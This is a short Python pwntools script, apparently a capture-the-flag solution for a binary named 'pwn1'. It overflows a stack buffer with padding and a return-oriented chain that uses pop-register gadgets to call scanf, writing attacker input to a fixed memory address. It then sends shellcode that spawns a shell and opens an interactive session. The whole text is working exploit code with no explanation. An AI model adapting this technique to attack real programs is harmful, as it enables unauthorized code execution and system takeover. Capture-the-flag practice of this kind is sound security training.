from pwn import *

r = process('./pwn1')
e = ELF('./pwn1')
context.arch = 'amd64'
prdi = 0x0000000000400613
prsi_p = 0x0000000000400611
fmt = 0x000000000040063b
scanf = 0x0000000000400460

def packAll(rop):
    return flat([p64(x) for x in rop])
rop = []
rop += [prdi, fmt]
rop += [prsi_p, 0x0000000000601040, 0]
rop += [scanf]
rop += [0x0000000000601040]

r.sendline('A'*0x18 + packAll(rop))
r.sendline(asm(shellcraft.amd64.linux.sh()))
r.interactive()
